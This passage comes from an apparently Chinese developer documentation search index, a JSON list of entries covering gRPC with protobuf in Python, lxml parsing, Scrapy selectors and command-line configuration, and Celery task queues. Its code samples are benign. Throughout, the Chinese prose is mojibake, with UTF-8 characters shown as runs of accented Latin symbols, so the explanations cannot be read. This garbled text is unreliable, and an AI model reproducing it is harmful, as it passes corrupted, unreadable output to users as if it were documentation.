ä¸‹çš„æ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ å‚è€ƒ: /docs/åç«¯/python/pythonæ ‡å‡†åº“/os","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-index.html","loc":"/yq-doc-source-docs-rear-end-python-index.html"},{"title":"grpcä½¿ç”¨å…¥é—¨","text":"RPC, è¿œç¨‹è¿‡ç¨‹è°ƒç”¨æœåŠ¡, æ³¨é‡ä¼ è¾“åè®®äºåºåˆ—åŒ–. ä¸€äº›è®¤è¯† /docs/æ‚ä¹±æ— ç« /è®¡ç®—æœºç½‘ç»œ/HTTPè®¤è¯† gRPCæ˜¯ç”±Googleå…¬å¸å¼€æºçš„é«˜æ€§èƒ½RPCæ¡†æ¶ã€‚æ”¯æŒå¤šè¯­è¨€ã€å¤šå¹³å°ï¼Œ å…¶æ¶ˆæ¯åè®®ä½¿ç”¨Googleè‡ªå®¶å¼€æºçš„Protocol Buffersåè®®æœºåˆ¶ï¼ˆproto3ï¼‰ åºåˆ—åŒ–ï¼Œä¼ è¾“ä½¿ç”¨HTTP/2æ ‡å‡†ï¼Œæ”¯æŒåŒå‘æµå’Œè¿æ¥å¤šè·¯å¤ç”¨ã€‚ å®‰è£… å®‰è£…: pip install grpc grpcio-tools ä½¿ç”¨æµç¨‹(ç”¨ä¾‹è¯´æ˜) ä»¥ä¸€ä¸ªç”¨ä¾‹è¯´æ˜. èƒŒæ™¯: ä¸šåŠ¡å·²æœ‰ä¸€ä¸ª Cat ç±», å¦‚ä¸‹ éœ€è¦ä¸ä¹‹ç›¸å…³çš„ rpc æœåŠ¡æ¥è·å–å…¶å±æ€§ æµç¨‹: ç¼–å†™protoæ–‡ä»¶, å®šä¹‰æ•°æ®é€šä¿¡åè®® æ ¹æ®ç¼–å†™å¥½çš„protoåè®®æ–‡ä»¶, ç”Ÿæˆç›¸åº”çš„pythonæ–‡ä»¶ ç¼–å†™serveræœåŠ¡ç«¯ ç¼–å†™clientå®¢æˆ·ç«¯ ç¼–å†™ proto åè®®æ–‡ä»¶ æ ¹æ®éœ€æ±‚ç¼–å†™å¥½protoåè®®æ–‡ä»¶å¦‚ä¸‹: å…¶ä¸­, ä½¿ç”¨messageæ¥è‡ªå®šä¹‰æ¶ˆæ¯ç±»å‹, å¦‚å®šä¹‰ä¸€ä¸ªStringæ¶ˆæ¯, åªåŒ…å«ä¸€ä¸ªstringç±»å‹æ•°æ®: message StringMessage{ string message = 1; } æŠ€å·§ å¯ç”¨ map å®šä¹‰mapç±»å‹ å¯ç”¨ repeated æ¥è¡¨ç¤ºå¯é‡å¤ç±»å‹, å¦‚: repeated string message = 1; æ³¨æ„mapé»˜è®¤å¯é‡å¤, ä¸èƒ½åŠ  repeated. ç§ä»¥ä¸º, ä¸€èˆ¬æƒ…å†µä¸‹, å¯¹äºæ™®é€šçš„æ•°æ®æˆ–è€…çº¦å®šå¥½çš„é€šç”¨æ¥å£ç±»å‹è¿”å›, ä½¿ç”¨messageå®šä¹‰è¾ƒæ–¹ä¾¿, ä½†æ˜¯å¯¹äºå…¶ä¸­çš„å¤æ‚æ•°æ®ç±»å‹, è¿˜æ˜¯ä½¿ç”¨ bytes ä¼ é€’äºŒè¿›åˆ¶æ•°æ®, è·å–åè‡ªè¡Œå¤„ç†è¾ƒæ–¹ä¾¿. è®°å¾—å¤§å­¦å­¦javaçš„é‚£æ®µæ—¶é—´, æ¥å£ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨ Result å°è£…çš„, å¤§æ¦‚å¦‚ä¸‹: class Result(){ int code; string message; Map<T, T> data; } åº”è¯¥æ˜¯è¿™æ ·, å…·ä½“è®°ä¸æ¸…äº†, å¾ˆä¹…æ²¡ç”¨äº†. å¦‚æœå°†è¿™ä¹ˆä¸€ä¸ªçº¦å®šå¥½çš„æ¥å£è¿”å›å†™è¿›proto, é‚£ä¹ˆå¯ä»¥è¿™æ ·: message Result{ int32 code = 1; string message = 2; bytes data = 3; } è¿™é‡Œmessageå®šä¹‰æ¶ˆæ¯å±æ€§çš„å€¼ä¸º 1, 2, 3 , å¹¶éå¼ºåˆ¶è¿™æ ·å†™, æˆ‘çœ‹ç½‘ä¸Šå¤§å¤šéƒ½æ˜¯æŒ‰ç…§123é¡ºåºå®šä¹‰å€¼, å¤šåŠæ˜¯è·Ÿç€å®˜ç½‘æ–‡æ¡£ç”¨ä¾‹æ¥çš„. å¦å¤–æœ¬æ–‡çš„åè®®æ–‡ä»¶å®šä¹‰äº†è¾ƒå¤šæ•°æ®ç±»å‹, æ­£å¼ä½¿ç”¨æ—¶æ˜¯ä¸å»ºè®®çš„, æœ€å¥½æ˜¯åªå®šä¹‰ä¸€ä¸ªè¯·æ±‚ç±»å‹, ä¸€ä¸ªè¿”å›ç±»å‹å§, æ­¤å¤„ä¸ºç”¨ä¾‹åªæ˜¯è¡¨ç¤ºå¯ä»¥è¿™ä¹ˆå†™. å¯ä»¥çœ‹å‡ºå¯¹äºåŸºæœ¬çš„æ•°æ®ç±»å‹, å¯ä»¥å¾ˆæ–¹ä¾¿å®šä¹‰, å“ªæ€•æ˜¯å¤æ‚ä¸€ç‚¹, æ¯”å¦‚æœ‰ä¸€ä¸ª Person ç±», ä¹Ÿå¯ä»¥è¿›è¡Œå¤šå±‚å°è£…. ä½†æ˜¯å¯¹äºpythonè€Œè¨€, å°¤å…¶æ˜¯å­—å…¸ç±»å‹, å…¶å€¼çš„ç±»å‹å¤§å¤šéƒ½ä¸æ˜¯æŒ‡å®šçš„, æ¯”å¦‚æœ¬ä¾‹çš„ Cat ç±»è·å–æ‰€æœ‰å±æ€§(get_all): def all_attr(self): return { 'name': self._name, # è¿™æ˜¯ str 'age': self._age, # è¿™æ˜¯ int 'love': self._love, # è¿™æ˜¯ tuple 'food_once': self._eat_food_once, # è¿™ä¸ªåˆ™æ˜¯ Dict[str, float] } è¿™ä¸ªæ—¶å€™ä½¿ç”¨ message ä¸­çš„æ™®é€šç±»å‹å°è£…å°±å¾ˆéš¾, æ‰€ä»¥è¿˜æ˜¯å†³å®šä½¿ç”¨ bytes ç›´æ¥ä¼ é€’äºŒè¿›åˆ¶çš„dataæ•°æ®æ–¹ä¾¿äº›. RpcCat æ˜¯rpcæœåŠ¡, å†…å®šä¹‰äº†å°†æ”¯æŒå“ªäº›è°ƒç”¨, å¦‚: rpc get_name (EmptyMessage) returns (StringMessage) {} è¡¨ç¤ºå®šä¹‰ä¸€ä¸ªrpcè°ƒç”¨, åä¸º get_name, è¯·æ±‚å‚æ•°ç±»å‹ä¸º EmptyMessage, è¿”å›å‚æ•°ç±»å‹ä¸º StringMessage (ä¸¤ç±»å‹å·²ç”¨messageå®šä¹‰). ç”Ÿæˆç›¸åº”çš„pythonæ–‡ä»¶ æ ¹æ®ç¼–å†™å¥½çš„protoæ–‡ä»¶ç”Ÿæˆå¯¹åº”çš„pyæ–‡ä»¶: mkdir proto python -m grpc_tools.protoc --pyi_out=./proto --python_out=./proto --grpc_python_out=./proto -I. rpc_cat.proto å‚æ•°è§£é‡Š: -I PATH , --proto_path= PATH protoæ–‡ä»¶è·¯å¾„, åŒ…æ‹¬å¯¼å…¥çš„ --pyi_out= OUT_DIR Generate Python pyi stub. --python_out= OUT_DIR Generate Python source file. --grpc_python_out= OUT_DIR Generate Python source file. æ³¨æ„è¿™é‡Œæˆ‘æ”¾åˆ°äº† proto æ–‡ä»¶å¤¹ä¸‹, éœ€è¦è‡ªè¡Œå¤„ç†ä¸€ä¸‹ç¯å¢ƒå¯¼å…¥é—®é¢˜: cd proto echo \"import sys sys.path.append('./proto') \" > __init__.py æ³¨è§£ protoc: protobuf ç¼–è¯‘å™¨(compile), å°† proto æ–‡ä»¶ç¼–è¯‘æˆä¸åŒè¯­è¨€çš„å®ç°, è¿™æ ·ä¸åŒè¯­è¨€ä¸­çš„æ•°æ®å°±å¯ä»¥å’Œ protobuf æ ¼å¼çš„æ•°æ®è¿›è¡Œäº¤äº’ protobuf è¿è¡Œæ—¶(runtime): protobuf è¿è¡Œæ—¶æ‰€éœ€è¦çš„åº“, å’Œ protoc ç¼–è¯‘ç”Ÿæˆçš„ä»£ç è¿›è¡Œäº¤äº’ ç¼–å†™serveræœåŠ¡ç«¯ æºç : æ³¨æ„ä¼ å‚å¿…é¡»ä½¿ç”¨ä½ç½®å‚æ•°: # message=self._cat.love() çš„ messageä¸èƒ½ä¸¢ return rpc_cat_pb2.TupleMessage(message=self._cat.love()) å¦åˆ™ä¼šæœ‰æŠ¥é”™: TypeError: No positional arguments allowed ç¼–å†™clientå®¢æˆ·ç«¯ æºç : å­—å…¸æ•°æ®ç›´æ¥ä½¿ç”¨ bytes å®šä¹‰æ¶ˆæ¯, ä½¿ç”¨ json è½¬æ¢, è¾ƒå¥½. æ³¨è§£ python å¯ç”¨çš„ rpc æ¡†æ¶è¿˜æ˜¯æ¯”è¾ƒå¤šçš„, æ¯”å¦‚ grpc, thrift, rrycç­‰ å…¶ä¸­ grpc ç­‰æ‹“å±•æ€§ç¨³å®šæ€§æ˜¯æœ€å¥½çš„ thrift å¯¹ python çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½, ä½†æ˜¯æ”¯æŒå¤šè¯­è¨€ rryc åŸºæœ¬æ˜¯æœåŠ¡äºçº¯python, å¯¹åªä½¿ç”¨ python çš„æœåŠ¡è¾ƒå‹å¥½ æ”¯æŒçš„é€šä¿¡æ–¹å¼ ä¸€æ¬¡è¯·æ±‚, ä¸€æ¬¡åº”ç­” ä¸€æ¬¡è¯·æ±‚, æµå¼åº”ç­” æµå¼è¯·æ±‚, ä¸€æ¬¡åº”ç­” æµå¼è¯·æ±‚, æµå¼åº”ç­” å¦‚è¦ä½¿ç”¨æµå¼è¯·æ±‚/åº”ç­”, å‚æ•°ç±»å‹å‰åŠ  stream å³å¯. æ¯”å¦‚ä¸Šé¢çš„ä¾‹å­, å®šä¹‰äº† æµè¯·æ±‚, åº”ç­”æµ: rpc get_attr_by_name_with_stream (stream StringMessage) returns (stream StringMessage) {} å¯¹äºpythonä»£ç ä¸­çš„å®ç°, ä½¿ç”¨è¿­ä»£å™¨å°±å¥½. clientç«¯, è¯·æ±‚: @property def _connection(self): if self._stub is None: # with grpc.aio.insecure_channel('localhost:50052') as channel: self._stub = cat_pb2_grpc.RpcCatStub(grpc.aio.insecure_channel('localhost:50052')) return self._stub def get_attr_by_stream(self): def stream_message(): for s in ('name', 'age', 'love'): yield cat_pb2.StringMessage(message=s) response = self._connection.get_attr_by_name_with_stream(stream_message()) return [x for x in response] serverç«¯, åº”ç­”: def get_attr_by_name_with_stream(self, request_iterator, context): for request in request_iterator: yield rpc_cat_pb2.StringMessage(message=self._cat.get_attr_by_name(request.message))","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-GRPC.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-GRPC.html"},{"title":"lxml","text":"githubåœ°å€: https://github.com/lxml/lxml å®˜æ–¹ä¸»é¡µ: <https://lxml.de> éœ€è¦å…ˆäº†è§£ /docs/åç«¯/python/æ•™ç¨‹/xpath/index çš„å‰ç½®çŸ¥è¯† å®‰è£…: pip install lxml lxmlæä¾›äº†ä¸¤ç§è§£æç½‘é¡µçš„æ–¹å¼ï¼Œä¸€ç§æ˜¯ä½ è§£æè‡ªå·±å†™çš„ç¦»çº¿ç½‘é¡µæ—¶ï¼Œå¦ä¸€ç§ åˆ™æ˜¯è§£æçº¿ä¸Šç½‘é¡µã€‚ å¯¼å…¥åŒ…: from lxml import etree 1.è§£æç¦»çº¿ç½‘é¡µ: html=etree.parse('xx.html',etree.HTMLParser()) aa=html.xpath('//*[@id=\"s_xmancard_news\"]/div/div[2]/div/div[1]/h2/a[1]/@href') print(aa) 2.è§£æåœ¨çº¿ç½‘é¡µ: from lxml import etree import requests rep=requests.get('https://www.baidu.com') html=etree.HTML(rep.text) aa=html.xpath('//*[@id=\"s_xmancard_news\"]/div/div[2]/div/div[1]/h2/a[1]/@href') print(aa)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-LXML.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-LXML.html"},{"title":"Scrapy APIå‚è€ƒ","text":"Response Selector SelectorList","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-index.html"},{"title":"å‘½ä»¤è¡Œå·¥å…·","text":"å‚è€ƒ: https://docs.scrapy.org/en/latest/topics/commands.html é…ç½®æ–‡ä»¶ä½ç½®: ä¼˜å…ˆçº§æœ€ä½ ç³»ç»Ÿé…ç½® /etc/scrapy.cfg or c:\\scrapy\\scrapy.cfg ä¼˜å…ˆçº§æ™®é€š ç”¨æˆ·é…ç½® ~/.config/scrapy.cfg ($XDG_CONFIG_HOME) and ~/.scrapy.cfg ($HOME) ä¼˜å…ˆçº§æœ€é«˜ é¡¹ç›®é…ç½® scrapy.cfg å®é™…ç”Ÿæ•ˆçš„é…ç½®å°†ä¼šåˆå¹¶ä¸Šè¿°æ‰€æœ‰çš„é…ç½®, æ”¯æŒçš„ç¯å¢ƒå˜é‡é…ç½®: SCRAPY_SETTINGS_MODULE (see Designating the settings) SCRAPY_PROJECT (see Sharing the root directory between projects) SCRAPY_PYTHON_SHELL (see Scrapy shell) é…ç½®å…±äº«å¤šä¸ªé¡¹ç›® æ³¨è§£ å¤šä¸ªé¡¹ç›®éƒ½éœ€è¦åœ¨å½“å‰ç›®å½• scrapy.cfg ä¸‹å®šä¹‰å¤šä¸ªé¡¹ç›®(ç›®å½•)çš„ scrapy.cfg : [settings] default = myproject1.settings project1 = myproject1.settings project2 = myproject2.settings é»˜è®¤æƒ…å†µä¸‹, scrapy æ‰§è¡Œä¼šä½¿ç”¨ default , ä½¿ç”¨ SCRAPY_PROJECT ç¯å¢ƒå˜é‡æ¥ åˆ‡æ¢ä¸åŒé¡¹ç›®: $ scrapy settings --get BOT_NAME Project 1 Bot $ export SCRAPY_PROJECT=project2 $ scrapy settings --get BOT_NAME Project 2 Bot ä½¿ç”¨ scrapy å·¥å…· æ¦‚è§ˆ: Scrapy X.Y - no active project è¯­æ³•: scrapy <command> [options] [args] æ”¯æŒå‘½ä»¤(ä¸éœ€è¦ä¾èµ–é¡¹ç›®): startproject åˆ›å»ºé¡¹ç›® è¯­æ³•: scrapy startproject <project_name> [project_dir] project_dir é¡¹ç›®æ¨¡å—ç›®å½•åç§°, å¦‚æœä¸æŒ‡å®š, å°±è·Ÿ myproject ä¸€è‡´ åç»­çš„æ“ä½œéƒ½è¦cdè¿›ç›®å½•: cd project_dir å…¶ä»–æŒ‡ä»¤ ä¸ä¾èµ–é¡¹ç›®ç›®å½•çš„æŒ‡ä»¤ bench fetch genspider runspider shell settings version view ä¾èµ–é¡¹ç›®ç›®å½•çš„æŒ‡ä»¤(åªæœ‰åœ¨é¡¹ç›®ç›®å½•ä¸‹æ‰å¯ä»¥æ­£å¸¸æ‰§è¡Œ) check crawl edit list parse è‡ªå®šä¹‰é¡¹ç›®æŒ‡ä»¤ ä½¿ç”¨ COMMANDS_MODULE é…ç½®åˆ° scrapy.cfg å®ç° COMMANDS_MODULE é…ç½®é¡¹ é»˜è®¤å€¼: '' (empty string) Example: COMMANDS_MODULE = \"mybot.commands\" é€šè¿‡ setup.py å…¥å£æ³¨å†Œ æ³¨è§£ ä¹Ÿå¯ä»¥é€šè¿‡é¢å¤–çš„åº“æ³¨å†Œ æ¯”å¦‚: from setuptools import setup, find_packages setup( name=\"scrapy-mymodule\", entry_points={ \"scrapy.commands\": [ \"my_command=my_scrapy_module.commands:MyCommand\", ], }, )","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-index.html"},{"title":"é€‰æ‹©å™¨","text":"ä¸»è¦æ˜¯é’ˆå¯¹ HTML / XML å…ƒç´ å§ é€‰æ‹©å™¨æ”¯æŒ, å‚è€ƒ Selectors ä¸»è¦æä¾›ä¸¤ç§: response.css() response.xpath() ç›¸å…³ç±»æ˜¯ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/Selector é™¤äº†è°ƒç”¨responseä½¿ç”¨, è¿˜å¯ä»¥ç›´æ¥å®ä¾‹ä½¿ç”¨: >>> from scrapy.selector import Selector >>> body = \"<html><body><span>good</span></body></html>\" >>> Selector(text=body).xpath(\"//span/text()\").get() 'good' æˆ–è€…è‡ªå·±æ„é€ response (HtmlResponse æ˜¯ TextResponse çš„å­ç±»): >>> from scrapy.selector import Selector >>> from scrapy.http import HtmlResponse >>> response = HtmlResponse(url=\"http://example.com\", body=body, encoding=\"utf-8\") >>> Selector(response=response).xpath(\"//span/text()\").get() 'good' Selectorä¼šè‡ªåŠ¨è§£æ xml/html å®æ—¶äº¤äº’è§£æ, å»ºè®®ä½¿ç”¨ scrapy shell <CmdShell> ä¸¤ç§é€‰æ‹©å™¨è¯¦è§£(ä¸Scrapyç»“åˆä½¿ç”¨) CSSé€‰æ‹©å™¨ XPathé€‰æ‹©å™¨ ç”šè‡³å¯ä»¥å°† XPath ä¸ CSS ç»“åˆä½¿ç”¨: # å¯¹äº <img src='image4_thumb.jpg' alt='image4'/> response.css(\"img\").xpath(\"@src\")","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-index.html"},{"title":"Scrapy","text":"Pythonçˆ¬è™«åº“ å®˜ç½‘: https://scrapy.org æ–‡æ¡£: https://docs.scrapy.org/en/latest/ Scrapy æ˜¯ç”¨ Python å®ç°çš„ä¸€ä¸ªä¸ºäº†çˆ¬å–ç½‘ç«™æ•°æ®ã€æå–ç»“æ„æ€§æ•°æ®è€Œç¼–å†™çš„åº”ç”¨æ¡†æ¶ã€‚ Scrapy å¸¸åº”ç”¨åœ¨åŒ…æ‹¬æ•°æ®æŒ–æ˜ï¼Œä¿¡æ¯å¤„ç†æˆ–å­˜å‚¨å†å²æ•°æ®ç­‰ä¸€ç³»åˆ—çš„ç¨‹åºä¸­ã€‚ é€šå¸¸æˆ‘ä»¬å¯ä»¥å¾ˆç®€å•çš„é€šè¿‡ Scrapy æ¡†æ¶å®ç°ä¸€ä¸ªçˆ¬è™«ï¼ŒæŠ“å–æŒ‡å®šç½‘ç«™çš„å†…å®¹æˆ–å›¾ç‰‡ã€‚ æ¶æ„ ä½¿ç”¨ é€‰æ‹©å™¨ å‘½ä»¤è¡Œå·¥å…· API å®‰è£…: pip install Scrapy æ³¨è§£ å»ºè®®å®‰è£…åœ¨è™šæ‹Ÿç¯å¢ƒä»¥é¿å…å†²çª ç›¸å…³åº“ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/lxml : é«˜æ•ˆçš„ xml å’Œ html è§£æå™¨ parsel: åŸºäº lxml ç¼–å†™çš„ä¸€ä¸ª HTML/XML æ•°æ®æå–åº“ w3lib: å¤„ç† URL å’Œç½‘é¡µç¼–ç çš„å¤šç”¨é€”åŠ©æ‰‹ twisted: å¼‚æ­¥ç½‘ç»œæ¡†æ¶ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/cryptography : å¤„ç†å„ç§ç½‘ç»œçº§å®‰å…¨éœ€æ±‚ pyOpenSSL: å¤„ç†å„ç§ç½‘ç»œçº§å®‰å…¨éœ€æ±‚ æ³¨è§£ è¿™äº›åº“å¯èƒ½ä¾èµ–éPyåº“ ç›¸å…³å·¥å…· Scrapy shell","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-index.html"},{"title":"celery","text":"å®‰è£…: pip install celery[librabbitmq,redis,auth,msgpack] è¯¦ç»†è§: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/celery_more/option_install ç®€ä»‹ åˆ†å¸ƒå¼ä»»åŠ¡é˜Ÿåˆ— ä¸€ä¸ªç®€å•ã€çµæ´»ã€å¯é çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå¯ç”¨äºå¤„ç†å¤§é‡æ¶ˆæ¯çš„æ¶ˆæ¯é˜Ÿåˆ—, å¯ç”¨äºå¤„ç†å®æ—¶æ•°æ®ä»¥åŠä»»åŠ¡è°ƒåº¦ ä»»åŠ¡é˜Ÿåˆ—: ä¸€èˆ¬ç”¨äºçº¿ç¨‹æˆ–è®¡ç®—æœºä¹‹é—´åˆ†é…å·¥ä½œçš„ä¸€ç§æœºåˆ¶ Celery é€šè¿‡æ¶ˆæ¯æœºåˆ¶è¿›è¡Œé€šä¿¡: Broker ä¸­é—´äºº Worker èŒç¨‹ å®¢æˆ·ç«¯å‘æ¶ˆæ¯é˜Ÿåˆ—å‘é€æ¶ˆæ¯, å®é™…å°±æ˜¯ç»™åˆ°äº† Broker, ç„¶å Broker å°†æ¶ˆæ¯å‘ç»™ Worker, ç”± Worker æ‰§è¡Œ. Celery å¯ä»¥åœ¨ä¸€å°æœºå™¨ä¸Šè¿è¡Œï¼Œä¹Ÿå¯ä»¥åœ¨å¤šå°æœºå™¨ä¸Šè¿è¡Œï¼Œç”šè‡³å¯ä»¥è·¨æ•°æ®ä¸­å¿ƒè¿è¡Œã€‚ ä¼˜ç‚¹: åˆ†å¸ƒå¼, å¯å¤šæœºè¿è¡Œ è·¨è¯­è¨€(åè®®) è‡ªå®šä¹‰æ¶ˆæ¯é˜Ÿåˆ—(Broker), å¦‚: rabbitmq, redis é«˜å¯ç”¨, å¦‚æœå‡ºç°ä¸¢å¤±è¿æ¥æˆ–è¿æ¥å¤±è´¥ï¼ŒèŒç¨‹ï¼ˆWorkerï¼‰å’Œå®¢æˆ·ç«¯ä¼šè‡ªåŠ¨é‡è¯•ï¼Œå¹¶ä¸”ä¸­é—´äººé€šè¿‡ ä¸»/ä¸» ä¸»/ä» çš„æ–¹å¼æ¥è¿›è¡Œæé«˜å¯ç”¨æ€§ã€‚ å¿«é€Ÿ, å•ä¸ª Celery è¿›è¡Œæ¯åˆ†é’Ÿå¯ä»¥å¤„ç†æ•°ä»¥ç™¾ä¸‡çš„ä»»åŠ¡ï¼Œè€Œä¸”å»¶è¿Ÿä»…ä¸ºäºšæ¯«ç§’ï¼ˆä½¿ç”¨ RabbitMQã€ librabbitmq åœ¨ä¼˜åŒ–è¿‡åï¼‰ã€‚ çµæ´», Celery çš„æ¯ä¸ªéƒ¨åˆ†å‡ ä¹éƒ½å¯ä»¥è‡ªå®šä¹‰æ‰©å±•å’Œå•ç‹¬ä½¿ç”¨. ä¾‹å¦‚è‡ªå®šä¹‰è¿æ¥æ± ã€åºåˆ—åŒ–æ–¹å¼ã€å‹ç¼©æ–¹å¼ã€æ—¥å¿—è®°å½•æ–¹å¼ã€ä»»åŠ¡è°ƒåº¦ã€ç”Ÿäº§è€…ã€æ¶ˆè´¹è€…ã€ä¸­é—´äººï¼ˆBrokerï¼‰ç­‰ã€‚ æ”¯æŒ Crontab å®šæ—¶ä»»åŠ¡ å†…å­˜ä¿æŠ¤, --max-tasks-per-child å‚æ•°é€‚ç”¨äºå¯èƒ½ä¼šå‡ºç°èµ„æºæ³„æ¼ï¼ˆä¾‹å¦‚ï¼šå†…å­˜æ³„æ¼ï¼‰çš„ä»»åŠ¡ æ—¶é—´å’Œé€Ÿç‡çš„é™åˆ¶, å¯ä»¥æ§åˆ¶æ¯ç§’/åˆ†é’Ÿ/å°æ—¶æ‰§è¡Œä»»åŠ¡çš„æ¬¡æ•°ï¼Œæˆ–è€…ä»»åŠ¡æ‰§è¡Œçš„æœ€é•¿æ—¶é—´ï¼Œä¹Ÿå°†è¿™äº›è®¾ç½®ä¸ºé»˜è®¤å€¼ï¼Œé’ˆå¯¹ç‰¹å®šçš„ä»»åŠ¡æˆ–ç¨‹åºè¿›è¡Œå®šåˆ¶åŒ–é…ç½® ç›¸å…³è¯´æ˜: Celery Beat: ä»»åŠ¡è°ƒåº¦å™¨ï¼ŒBeat è¿›ç¨‹ä¼šè¯»å–é…ç½®æ–‡ä»¶çš„å†…å®¹ï¼Œå‘¨æœŸæ€§çš„å°†é…ç½®ä¸­åˆ°æœŸéœ€è¦æ‰§è¡Œçš„ä»»åŠ¡å‘é€ç»™ä»»åŠ¡é˜Ÿåˆ— Celery Worker: æ‰§è¡Œä»»åŠ¡çš„æ¶ˆè´¹è€…ï¼Œé€šå¸¸ä¼šåœ¨å¤šå°æœåŠ¡å™¨è¿è¡Œå¤šä¸ªæ¶ˆè´¹è€…æ¥æé«˜è¿è¡Œæ•ˆç‡ Broker: æ¶ˆæ¯ä»£ç†ï¼Œä¹Ÿæ˜¯ä»»åŠ¡é˜Ÿåˆ—æœ¬èº«ï¼ˆé€šå¸¸æ˜¯æ¶ˆæ¯é˜Ÿåˆ—æˆ–è€…æ•°æ®åº“ï¼‰ï¼Œé€šå¸¸ç§°ä¸ºæ¶ˆæ¯ä¸­é—´ä»¶ï¼Œ æ¥æ”¶ä»»åŠ¡ç”Ÿäº§è€…å‘é€è¿‡æ¥çš„ä»»åŠ¡æ¶ˆæ¯ï¼Œå­˜è¿›é˜Ÿåˆ—å†æŒ‰åºåˆ†å‘ç»™ä»»åŠ¡æ¶ˆè´¹æ–¹ Producer: ä»»åŠ¡ç”Ÿäº§è€…ï¼Œè°ƒç”¨ Celery API çš„å‡½æ•°æˆ–è€…è£…é¥°å™¨è€Œäº§ç”Ÿä»»åŠ¡å¹¶äº¤ç»™ä»»åŠ¡é˜Ÿåˆ—å¤„ç†çš„éƒ½æ˜¯ä»»åŠ¡ç”Ÿäº§è€… ä¸­é—´ä»¶é…ç½® Celery éœ€è¦æ¶ˆæ¯ä¸­é—´ä»¶æ¥è¿›è¡Œå‘é€å’Œæ¥æ”¶æ¶ˆæ¯ã€‚ RabbitMQ å’Œ Redis ä¸­é—´äººçš„åŠŸèƒ½æ¯”è¾ƒé½å…¨ï¼Œä½†ä¹Ÿæ”¯æŒå…¶å®ƒçš„å®éªŒæ€§çš„è§£å†³æ–¹æ¡ˆï¼Œå…¶ä¸­åŒ…æ‹¬ SQLite è¿›è¡Œæœ¬åœ°å¼€å‘ã€‚ åº”ç”¨è®¾è®¡(ç¼–ç ) task.py: from celery import Celery app = Celery('tasks', broker='amqp://guest@localhost//') @app.task def add(x, y): return x + y ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå½“å‰æ¨¡å—çš„åç§°ï¼Œåªæœ‰åœ¨ __main__ æ¨¡å—ä¸­å®šä¹‰ä»»åŠ¡æ—¶æ‰ä¼šç”Ÿäº§åç§°ã€‚ ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸­é—´äººï¼ˆBrokerï¼‰çš„é“¾æ¥ URLã€‚ appçš„ä¼ é€’ å³ Celery å®ä¾‹ çš„å…±äº«, ä¸€èˆ¬ä¸å»ºè®®ä½¿ç”¨å…¨å±€çš„ app å˜é‡, è€Œæ˜¯ä»¥å‚æ•°ä¼ é€’çš„å½¢å¼æ›¿ä»£: class Scheduler(object): def __init__(self, app): self.app = app åœ¨celeryå†…éƒ¨å®ç°ä¸­ï¼Œä½¿ç”¨ celery.app_or_default() å‡½æ•°ä½¿å¾—æ¨¡å—çº§åˆ«çš„ API ä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨: from celery.app import app_or_default class Scheduler(object): def __init__(self, app=None): self.app = app_or_default(app) åœ¨å¼€å‘ç¯å¢ƒä¸­ï¼Œå¯ä»¥é€šè¿‡è®¾ç½® CELERY_TRACE_APP ç¯å¢ƒå˜é‡åœ¨åº”ç”¨å®ä¾‹é“¾è¢«æ‰“ç ´æ—¶æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸: $ CELERY_TRACE_APP=1 celery worker -l info ä¸­æ–‡ç¿»è¯‘æ–‡æ¡£ç§°å…¶ä¸º æ‰“ç ´é“¾å¼æ“ä½œï¼šBreaking the chain ä¸æ˜¯æ€ä¹ˆç†è§£æ˜¯ä½•å«ä¹‰ å¯åŠ¨Worker å¯åŠ¨/è¿è¡Œ Celery èŒç¨‹ï¼ˆWorkerï¼‰æœåŠ¡ å‘½ä»¤è¡Œå¯åŠ¨ code: celery -A tasks worker --loglevel=info # celery -A src.time_schedule --workdir ./ worker -l info -E æ³¨è§£ å¯ä»¥æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯: celery --help ç›´æ¥åœ¨ python ä¸­å¯åŠ¨ è°ƒè¯•æ—¶ä½¿ç”¨æ¯”è¾ƒæ–¹ä¾¿, æˆ–è€…æ˜¯ä¸€äº›éœ€è¦åœ¨ä»£ç å†…éƒ¨å¯åŠ¨æ—¶ å¯åŠ¨ä¸€ä¸ªèŒç¨‹ï¼ˆWorkerï¼‰:: from celery import Celery app = Celery() @app.task def add(x, y): return x + y if __name__ == '__main__': app.worker_main() æ‰‹åŠ¨è°ƒç”¨ä»»åŠ¡ å‘½ä»¤è¡Œ ä½¿ç”¨å‘½ä»¤è¡Œçš„æ–¹å¼, è¯¦æƒ…å¯å‚è€ƒ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/celery_more/å‘½ä»¤è¡Œå·¥å…· ä¾‹:: celery -A src.time_schedule call -a '[2, 2]' src.time_schedule.pre_tasks.add 7506ef60-5621-460a-8219-7a97f6e96f4e ä»£ç ä½¿ç”¨æ–¹å¼ 